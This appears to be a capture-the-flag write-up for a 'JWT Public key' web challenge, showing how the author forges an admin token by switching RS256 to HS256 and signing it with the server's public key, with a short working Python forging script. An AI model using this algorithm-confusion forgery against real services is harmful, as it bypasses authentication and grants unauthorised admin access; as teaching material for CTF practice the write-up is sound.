# JSON Web Token (JWT) - Public key (Medium)

![image](https://user-images.githubusercontent.com/83667873/150842727-e890094f-336d-4994-b60d-6df691aa5b70.png)

First endpoint /key provides public key

Second endpoint /auth will provide jwt token with your username (you need to provide it in request body - method POST)

Third endpoint /admin, you check you are admin or not by `Authorization: Bearer YOURTOKEN` (you need to provide your token - method POST). If you are admin, you will get the flag.

Firstly, get the public key:

![image](https://user-images.githubusercontent.com/83667873/150844931-df988ba1-034b-4191-847b-17211c24fcd3.png)


Next, I will try to get a sample jwt token, you can't use `admin` as value for username:

![image](https://user-images.githubusercontent.com/83667873/150843631-f3ce4870-35c8-4923-b193-fd9989722a02.png)

Use jwt.io to decode this value:

![image](https://user-images.githubusercontent.com/83667873/150843756-7ee1545c-f1e6-45de-b9f8-ced0bd09bbb7.png)

Payload part is pretty simple, just `username`. Pay attention to Headers part, you will see the algorithm is using is `RS256` with this algorithm, token will be encode by private and decode by public key,

But we just have public key, so we can't create a new valid token to access `/admin`. So what happen if we change the algorithm to `HS256`, this algorithm use same key to encode and decode jwt token. Okay, let's try:

Use below code to create a new jwt token use `HS256` algorithm:

```
import jwt
from codecs import encode, decode
import hmac 
import hashlib

key = open('key','rb').read()

header = b'{"typ":"JWT","alg":"HS256"}'
header = encode(header,'base64').strip()
payload = b'{"username":"admin"}'
payload = encode(payload,'base64').strip()
sig = hmac.new(key, header + b'.' + payload, hashlib.sha256).digest().strip()
sig = encode(sig, 'base64').strip()
jwt = '{}.{}.{}'.format(header.decode(), payload.decode(), sig.decode())

print(jwt)

```

![image](https://user-images.githubusercontent.com/83667873/150845970-5f73c9f0-12a7-4979-974d-33ccfe74d772.png)

Use this token, I can access to /admin and get the flag:

![image](https://user-images.githubusercontent.com/83667873/150846229-92057d9f-d5ce-4abf-88b2-352e213008d8.png)

